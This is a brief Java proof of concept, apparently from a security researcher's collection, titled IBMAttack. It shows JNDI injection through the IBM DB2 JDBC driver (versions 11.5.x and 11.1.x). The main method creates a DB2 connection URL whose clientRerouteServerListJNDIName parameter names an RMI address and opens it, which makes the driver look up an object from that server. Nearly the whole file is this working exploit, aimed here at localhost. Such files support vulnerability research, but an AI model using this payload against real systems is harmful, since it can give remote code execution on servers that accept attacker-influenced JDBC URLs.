package ibm;

import java.sql.DriverManager;

/**
 * JNDI
 * <p>
 * version
 * ALL [11.5.x, 11.1.x]
 *
 * @author Whoopsunix
 */
public class IBMAttack {
    public static void main(String[] args) throws Exception {
        String jndi = "jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=rmi://127.0.0.1:1099/vabnob;";
        connect(jndi);
    }

    public static void connect(String jdbcUrl) throws Exception {
        Class.forName("com.ibm.db2.jcc.DB2Driver");

        DriverManager.getConnection(jdbcUrl);
    }
}
